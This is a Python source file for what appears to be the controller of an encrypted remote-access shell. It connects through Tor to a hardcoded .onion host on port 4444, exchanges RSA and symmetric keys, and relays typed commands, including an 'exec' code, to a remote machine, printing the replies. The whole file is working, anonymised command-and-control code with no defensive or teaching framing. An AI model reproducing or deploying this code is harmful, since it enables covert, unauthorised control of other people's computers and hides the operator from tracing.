import socket
import subprocess
import sock_op_handler
from time import sleep
from socks import socksocket, SOCKS5
from EnDeCrypt import generateAsymmetricalKeys, generateSymmetricalKey, import_key, encryptStringSymmetrical, encryptStringAsymmetrical, \
    decryptStringAsymmetrical


# connect_ip = "127.0.0.1"
connect_ip = "jme2ik6vzqiyayjv6pfu4nk5n2lbjpeq7pxtp5bwyxzedwbzhrjksnad.onion"
connect_port = 4444

public_key = b""
private_key = b""
cs_public_key = b""
symmetrical_key = b""

connection = socket.socket()
server_socket = socket.socket()
connection_errors = (ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError, ValueError)  # == ConnectionError.__class__


def create_keys() -> (bytes, bytes): return generateAsymmetricalKeys(), generateSymmetricalKey()


def log(text: (str, bytes)):
    print(text)


def get_proxy_socket():
    s = socksocket()
    s.set_proxy(SOCKS5, "127.0.0.1", 9050)
    return s


def start_tor():
    def execute(cmd):
        popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        for stdout_line in iter(popen.stdout.readline, ""):
            yield stdout_line
        popen.stdout.close()
        return_code = popen.wait()
        if return_code:
            raise subprocess.CalledProcessError(return_code, cmd)
    for path in execute(r"tor-win32-0.4.5.10/Tor/tor.exe"):
        print(path)
        if "100%" in path:
            log("I  |  Successfully started Tor")


def connect(tor):
    global connection
    if tor:
        connection = get_proxy_socket()
    else:
        connection = socket.socket()
    while True:
        try:
            log("I  |  Connecting")
            connection.connect((connect_ip, connect_port))
            log("I  |  Connected")
            break
        except TimeoutError:
            pass
        except connection_errors:
            pass
        log("Sleeping 2 seconds")
        sleep(2)


def recv_send_keys():
    global cs_public_key, symmetrical_key
    try:
        log("I  |  Exchanging asymmetrical keys")
        cs_public_key = import_key(connection.recv(271))
        connection.send(public_key.exportKey())
        log("I  |  Sending symmetrical key")
        connection.send(encryptStringAsymmetrical(symmetrical_key, cs_public_key))
        log("I  |  Successfully exchanged keys")
        sock_op_handler.key = symmetrical_key
        sock_op_handler.client = connection
    except connection_errors:
        connection.close()
        log("Lost connection to client_connection while exchanging keys")
        exit(-1)


class shell:
    received = None

    def recv(self):
        return sock_op_handler.recv()

    def send(self, text: str):
        sock_op_handler.send(encryptStringSymmetrical(text, symmetrical_key))

    def run(self):
        code_list = {"exit": "CODE:EXIT", "exec": "CODE:EXEC"}
        command = None
        _command = None

        while command != "exit":
            command = input(self.recv() + ">").strip()
            if command == "":
                continue
            elif command.split()[0] in code_list.keys():
                if command == "exit":
                    self.send(code_list[command])
                    connection.close()
                    break
                else:
                    _command = command.split()
                    command = code_list[_command[0]] + command.replace(_command[0], "")

            self.send(command)
            self.received = self.recv()
            if self.received.count("\n") > 1:
                if self.received[0] != "\n":
                    self.received = "\n" + self.received
                if self.received[-1] != "\n":
                    self.received += "\n"
            print(self.received)


shell_instance = shell()


def main(tor):
    global cs_public_key
    if tor:
        try:
            start_tor()
        except Exception as e:
            log(f"E  |  Error: {e}")
    while True:
        connect(tor=tor)
        try:
            recv_send_keys()
            shell_instance.run()
        except connection_errors:
            connection.close()
            log(f"E  |  Lost connection")
            continue


if __name__ == '__main__':
    private_key, public_key = create_keys()
    main(tor=False)
